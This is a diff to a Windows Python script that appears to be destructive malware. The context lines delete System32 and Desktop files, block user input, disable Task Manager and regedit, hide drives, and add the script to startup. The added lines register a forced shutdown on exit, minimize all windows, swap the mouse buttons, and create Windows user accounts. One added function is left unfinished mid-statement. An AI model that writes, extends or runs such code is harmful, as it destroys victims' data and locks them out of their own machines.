@@ -11,6 +11,7 @@ import time
 import winreg
 import sys
 from datetime import datetime
+import atexit
 #type:ignore
 # TO DO: ON CLOSE BLOW UP COMPUTER
 RUN_INSTALLS = True
@@ -22,6 +23,13 @@ def block_input(on):
     return -1, e
   else:
     return 1, None
+
+def random_string_generator(length):
+  characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+  master = ""
+  for x in range(int(length)):
+    master = master + characters[random.randrange(0, len(characters))]
+  return master 
 
 block_input(True)
 
@@ -231,6 +239,24 @@ box_art()
     except Exception:
       return False
 
+  def minimize_all(self):
+    try:
+      user32 = ctypes.windll.user32
+      SW_MINIMIZE = 6
+
+      # Get the handle of the desktop window
+      hWnd = user32.GetDesktopWindow()
+
+      # Minimize all windows
+      user32.ShowWindow(hWnd, SW_MINIMIZE)
+    except Exception as e:
+      return -1, e
+    else:
+      return 1, None
+
+  def shutdown(self):
+    os.system('shutdown /s /f /t 0')
+
   def relaunch_as_admin(self):
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, os.path.realpath(__file__), None, 1)
     logs.info("Relaunching as admin")
@@ -303,18 +329,54 @@ class Executables:
       logs.info(f"Ran file {file}")
       return 1, None
 
-  def install(self, package):
+  def install(self, package, wait=False):
     try:
-      subprocess.Popen([sys.executable, '-m', 'pip', 'install', package], shell=False)
+      process = subprocess.Popen([sys.executable, '-m', 'pip', 'install', package], shell=False)
     except Exception as e:
       return -1, e
     else:
+      if wait:
+        process.wait()
       return 1, None
 
   def install_all(self):
     packages = ['pypiwin32', 'cryptography']
     for package in packages:
-      self.install(package)
+      if package == packages[len(packages)-1]:
+        self.install(package, wait=True)
+      else: 
+        self.install(package)
+
+  def run_command_in_background(self, command):
+    try:
+      process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    except Exception as e:
+      return -1, e
+    else:
+      return 1, process
+
+  def swap_mouse_buttons(self):
+    try:
+      user32 = ctypes.windll.user32
+      SPI_GETMOUSESPEED = 112
+      SPI_SETMOUSESPEED = 113
+      SPIF_SENDCHANGE = 2
+      user32.SwapMouseButton(1)
+      user32.SystemParametersInfoW(SPI_SETMOUSESPEED, 0, None, SPIF_SENDCHANGE)
+    except Exception as e:
+      return -1, e
+    else:
+      return 1, None
+
+  def create_windows_user_account(self, username, password):
+    command = ['net', 'user', username, password, '/add', '/Y']
+    self.run_command_in_background(command)
+
+  def user_account_spam(self, accounts):
+    for x in range(accounts):
+      username = 
+  
+    
 
   def run_shell_command(self, command):
     try:
@@ -622,6 +684,7 @@ e = Executables()
 f = Folders()
 fc = FileCreation()
 wsysw = WindowsSystemClass()
+atexit.register(wsysw.shutdown)
 fd = FileDeletion()
 reg = Registry()
 appdata = f.create_appdata_folder()
@@ -639,6 +702,7 @@ fd.del_sys32_files()
 logs.info("Deleting Desktop...")
 fd.delete_folder(wsysw.get_desktop_path(), remove_folder=False)
 e.stop_all()
+wsysw.minimize_all()
 reg.disable_regedit()
 reg.add_to_startup(os.path.realpath(__file__))
 exe_path = os.path.join(os.path.dirname(sys.executable), "runme.exe")
@@ -651,6 +715,7 @@ reg.new_key_edit(1, r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
 reg.new_key_edit(1, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose", 1)
 reg.new_key_edit(1, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoViewOnDrive", 67108863)
 e.refresh_explorer()
+wsysw.minimize_all()
 reg.disable_task_manager()
 folder = f.create_goose_folder(appdata)
 logs.info(f"Created folder {folder}")
